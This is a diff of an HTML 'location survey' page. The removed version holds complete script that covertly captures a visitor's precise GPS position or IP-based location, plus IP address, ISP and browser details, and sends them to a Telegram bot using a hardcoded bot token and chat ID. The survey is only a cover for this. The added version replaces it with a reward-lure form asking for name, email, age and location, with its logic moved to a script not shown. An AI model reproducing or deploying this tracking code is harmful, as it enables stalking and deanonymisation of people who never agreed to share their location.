@@ -3,167 +3,230 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>State Survey</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: url('https://source.unsplash.com/1600x900/?city') no-repeat center center fixed;
-            background-size: cover;
-            color: white;
-            text-align: center;
-            padding: 50px;
-        }
-        .container {
-            background: rgba(0, 0, 0, 0.8);
-            padding: 20px;
-            border-radius: 10px;
-            display: inline-block;
-        }
-        .hidden { display: none; }
-        input, button {
-            padding: 10px;
-            margin: 10px;
-            width: 80%;
-        }
-    </style>
+    <title>Location Survey - Earn Rewards</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
     <div class="container">
-        <h1 id="title">Welcome to the State Survey</h1>
-        <p id="loading">Fetching your location...</p>
-        <p id="error" class="hidden" style="color: red;"></p>
+        <div id="welcome-screen" class="screen active">
+            <div class="welcome-content">
+                <h1 class="title">Welcome to Location Survey</h1>
+                <p class="subtitle">Complete the survey about your location and earn rewards!</p>
+                <div class="location-permission">
+                    <i class="fas fa-map-marker-alt location-icon"></i>
+                    <p>We need your location for accurate results</p>
+                    <button id="get-location-btn" class="btn primary-btn">Allow Location Access</button>
+                </div>
+                <div id="location-status" class="hidden">
+                    <div class="loader"></div>
+                    <p>Getting your location...</p>
+                </div>
+            </div>
+        </div>
 
-        <div id="survey" class="hidden">
-            <h2 id="question"></h2>
-            <input type="text" id="answer" placeholder="Your Answer">
-            <button onclick="submitSurvey()">Submit</button>
+        <div id="survey-screen" class="screen">
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div id="progress" class="progress"></div>
+                </div>
+                <div class="step-indicator">
+                    <span id="current-step">1</span>/<span id="total-steps">5</span>
+                </div>
+            </div>
+
+            <form id="survey-form">
+                <!-- Step 1: Basic Information -->
+                <div class="survey-step active" data-step="1">
+                    <h2>Basic Information</h2>
+                    <div class="form-group">
+                        <label for="name">Full Name</label>
+                        <input type="text" id="name" name="name" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="email">Email Address</label>
+                        <input type="email" id="email" name="email" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="age">Age</label>
+                        <input type="number" id="age" name="age" min="18" max="100" required>
+                    </div>
+                </div>
+
+                <!-- Step 2: Location Verification -->
+                <div class="survey-step" data-step="2">
+                    <h2>Your Location</h2>
+                    <div class="location-info">
+                        <div class="location-card">
+                            <i class="fas fa-map-marked-alt"></i>
+                            <div class="location-details">
+                                <p>We detected your location as:</p>
+                                <h3 id="detected-country">Loading...</h3>
+                                <h3 id="detected-state">Loading...</h3>
+                                <h3 id="detected-city">Loading...</h3>
+                            </div>
+                        </div>
+                        <p class="location-confirmation">Is this information correct?</p>
+                        <div class="confirmation-buttons">
+                            <button type="button" id="location-correct" class="btn secondary-btn">Yes, it's correct</button>
+                            <button type="button" id="location-incorrect" class="btn outline-btn">No, there's an error</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Step 3: Residence Duration -->
+                <div class="survey-step" data-step="3">
+                    <h2>Residence Information</h2>
+                    <div class="form-group">
+                        <label for="residence-years">How long have you lived at your current location?</label>
+                        <select id="residence-years" name="residence-years" required>
+                            <option value="" disabled selected>Select an option</option>
+                            <option value="less-than-1">Less than 1 year</option>
+                            <option value="1-3">1-3 years</option>
+                            <option value="4-6">4-6 years</option>
+                            <option value="7-10">7-10 years</option>
+                            <option value="more-than-10">More than 10 years</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Do you plan to move in the next 2 years?</label>
+                        <div class="radio-group">
+                            <label class="radio-label">
+                                <input type="radio" name="plan-to-move" value="yes" required>
+                                <span class="radio-custom"></span>
+                                Yes
+                            </label>
+                            <label class="radio-label">
+                                <input type="radio" name="plan-to-move" value="no">
+                                <span class="radio-custom"></span>
+                                No
+                            </label>
+                            <label class="radio-label">
+                                <input type="radio" name="plan-to-move" value="unsure">
+                                <span class="radio-custom"></span>
+                                Not sure
+                            </label>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Step 4: Location Satisfaction -->
+                <div class="survey-step" data-step="4">
+                    <h2>Location Satisfaction</h2>
+                    <div class="form-group">
+                        <label>How satisfied are you with your current location?</label>
+                        <div class="rating-container">
+                            <div class="rating">
+                                <input type="radio" id="star5" name="location-rating" value="5" required>
+                                <label for="star5"><i class="fas fa-star"></i></label>
+                                <input type="radio" id="star4" name="location-rating" value="4">
+                                <label for="star4"><i class="fas fa-star"></i></label>
+                                <input type="radio" id="star3" name="location-rating" value="3">
+                                <label for="star3"><i class="fas fa-star"></i></label>
+                                <input type="radio" id="star2" name="location-rating" value="2">
+                                <label for="star2"><i class="fas fa-star"></i></label>
+                                <input type="radio" id="star1" name="location-rating" value="1">
+                                <label for="star1"><i class="fas fa-star"></i></label>
+                            </div>
+                            <div class="rating-text">Select a rating</div>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="location-pros">What do you like most about your current location?</label>
+                        <textarea id="location-pros" name="location-pros" rows="3" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label for="location-cons">What would you improve about your current location?</label>
+                        <textarea id="location-cons" name="location-cons" rows="3" required></textarea>
+                    </div>
+                </div>
+
+                <!-- Step 5: Additional Information -->
+                <div class="survey-step" data-step="5">
+                    <h2>Additional Information</h2>
+                    <div class="form-group">
+                        <label>Which of the following services do you use regularly in your area?</label>
+                        <div class="checkbox-group">
+                            <label class="checkbox-label">
+                                <input type="checkbox" name="services" value="public-transport">
+                                <span class="checkbox-custom"></span>
+                                Public Transportation
+                            </label>
+                            <label class="checkbox-label">
+                                <input type="checkbox" name="services" value="food-delivery">
+                                <span class="checkbox-custom"></span>
+                                Food Delivery Services
+                            </label>
+                            <label class="checkbox-label">
+                                <input type="checkbox" name="services" value="ride-sharing">
+                                <span class="checkbox-custom"></span>
+                                Ride Sharing (Uber, Lyft, etc.)
+                            </label>
+                            <label class="checkbox-label">
+                                <input type="checkbox" name="services" value="grocery-delivery">
+                                <span class="checkbox-custom"></span>
+                                Grocery Delivery
+                            </label>
+                            <label class="checkbox-label">
+                                <input type="checkbox" name="services" value="local-events">
+                                <span class="checkbox-custom"></span>
+                                Local Events & Entertainment
+                            </label>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="additional-comments">Any additional comments about your location?</label>
+                        <textarea id="additional-comments" name="additional-comments" rows="3"></textarea>
+                    </div>
+                </div>
+
+                <div class="form-navigation">
+                    <button type="button" id="prev-btn" class="btn outline-btn" disabled>Previous</button>
+                    <button type="button" id="next-btn" class="btn primary-btn">Next</button>
+                    <button type="submit" id="submit-btn" class="btn primary-btn hidden">Submit Survey</button>
+                </div>
+            </form>
+        </div>
+
+        <div id="completion-screen" class="screen">
+            <div class="completion-content">
+                <div class="success-animation">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <h1>Thank You!</h1>
+                <p>Your survey has been successfully submitted.</p>
+                <div class="reward-info">
+                    <h2>Your Reward</h2>
+                    <div class="reward-card">
+                        <i class="fas fa-gift"></i>
+                        <div class="reward-details">
+                            <h3>$10 Gift Card</h3>
+                            <p>Your reward code: <span id="reward-code">Loading...</span></p>
+                            <p class="reward-instructions">Use this code at checkout on our partner websites.</p>
+                        </div>
+                    </div>
+                </div>
+                <button id="new-survey-btn" class="btn primary-btn">Take Another Survey</button>
+            </div>
+        </div>
+
+        <div id="error-screen" class="screen">
+            <div class="error-content">
+                <div class="error-animation">
+                    <i class="fas fa-exclamation-circle"></i>
+                </div>
+                <h1>Location Access Required</h1>
+                <p>We need access to your location to proceed with the survey.</p>
+                <p class="error-message">Please enable location services in your browser and try again.</p>
+                <button id="retry-location-btn" class="btn primary-btn">Try Again</button>
+            </div>
         </div>
     </div>
 
-    <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            gsap.from("#title", { opacity: 0, y: -20, duration: 1 });
+    <footer>
+        <p>&copy; 2023 Location Survey. All rights reserved.</p>
+    </footer>
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
-            } else {
-                showError("Geolocation is not supported by your browser.");
-            }
-        });
-
-        async function success(position) {
-            let lat = position.coords.latitude;
-            let lon = position.coords.longitude;
-            
-            console.log("📍 GPS Location Found:", lat, lon);
-
-            try {
-                let locationResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
-                let locationData = await locationResponse.json();
-
-                let state = locationData.address.state || "Unknown State";
-                let city = locationData.address.city || locationData.address.town || "Unknown City";
-                let country = locationData.address.country || "Unknown Country";
-                
-                let googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
-
-                // Fetch IP & ISP details
-                let ipResponse = await fetch("https://ipapi.co/json/");
-                let ipData = await ipResponse.json();
-
-                document.getElementById("loading").style.display = "none";
-                document.getElementById("survey").classList.remove("hidden");
-                document.getElementById("question").innerText = `How do you feel about living in ${state}?`;
-
-                sendToTelegram(state, city, country, lat, lon, googleMapsLink, ipData);
-
-            } catch (err) {
-                console.error("❌ Error fetching location details:", err);
-                showError("Failed to fetch location details. Using IP-based location.");
-                getIPLocation();
-            }
-        }
-
-        function error(err) {
-            console.warn("⚠️ Geolocation Error:", err);
-            showError("Failed to get GPS location. Using IP-based location.");
-            getIPLocation();
-        }
-
-        async function getIPLocation() {
-            try {
-                let ipResponse = await fetch("https://ipapi.co/json/");
-                let ipData = await ipResponse.json();
-
-                let state = ipData.region || "Unknown State";
-                let city = ipData.city || "Unknown City";
-                let country = ipData.country_name || "Unknown Country";
-
-                let googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude}`;
-
-                document.getElementById("loading").style.display = "none";
-                document.getElementById("survey").classList.remove("hidden");
-                document.getElementById("question").innerText = `How do you feel about living in ${state}?`;
-
-                sendToTelegram(state, city, country, ipData.latitude, ipData.longitude, googleMapsLink, ipData);
-            } catch (err) {
-                showError("Location retrieval failed.");
-            }
-        }
-
-        async function sendToTelegram(state, city, country, lat, lon, mapsLink, ipData) {
-            let botToken = "7082348594:AAENnyiU1uxvjATBwFinj5jcI3YgsiCzB2A";
-            let chatID = "1201917438"; // Replace with your actual Chat ID
-
-            let message = `
-🌍 **New User Location Data**  
-📍 **City:** ${city}  
-🏛 **State:** ${state}  
-🌎 **Country:** ${country}  
-📌 **Latitude:** ${lat}  
-📌 **Longitude:** ${lon}  
-📍 **Google Maps:** [View Location](${mapsLink})  
-
-💻 **IP Address:** ${ipData.ip}  
-🌐 **ISP:** ${ipData.org}  
-🖥 **User-Agent:** ${navigator.userAgent}
-            `;
-
-            try {
-                let response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: chatID,
-                        text: message,
-                        parse_mode: "Markdown"
-                    })
-                });
-
-                let result = await response.json();
-                console.log("✅ Telegram Response:", result);
-            } catch (error) {
-                console.error("❌ Telegram API Error:", error);
-            }
-        }
-
-        function showError(message) {
-            document.getElementById("loading").style.display = "none";
-            let errorElement = document.getElementById("error");
-            errorElement.innerText = message;
-            errorElement.classList.remove("hidden");
-        }
-
-        function submitSurvey() {
-            let answer = document.getElementById("answer").value.trim();
-            if (answer === "") {
-                alert("Please enter your answer before submitting.");
-            } else {
-                alert("Thank you for your response!");
-                document.getElementById("answer").value = "";
-            }
-        }
-    </script>
+    <script src="script.js"></script>
 </body>
 </html>
